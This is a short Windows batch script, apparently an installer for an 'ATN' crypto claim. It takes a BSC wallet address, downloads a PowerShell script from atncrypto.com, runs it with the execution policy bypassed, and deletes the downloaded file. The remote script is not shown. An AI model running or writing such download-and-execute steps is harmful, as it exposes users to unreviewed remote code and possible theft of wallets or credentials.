@echo off
setlocal
set "WALLET=%~1"

if "%WALLET%"=="" (
  echo Usage: atn-install.cmd 0xYourBSCWallet
  exit /b 1
)

set "PS1=%TEMP%\atn-install.ps1"
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "Invoke-WebRequest -UseBasicParsing -Uri 'https://atncrypto.com/claim/dl/install.ps1' -OutFile '%PS1%'"
powershell -NoProfile -ExecutionPolicy Bypass -File "%PS1%" -Wallet "%WALLET%"
del "%PS1%" >nul 2>&1
echo Done.

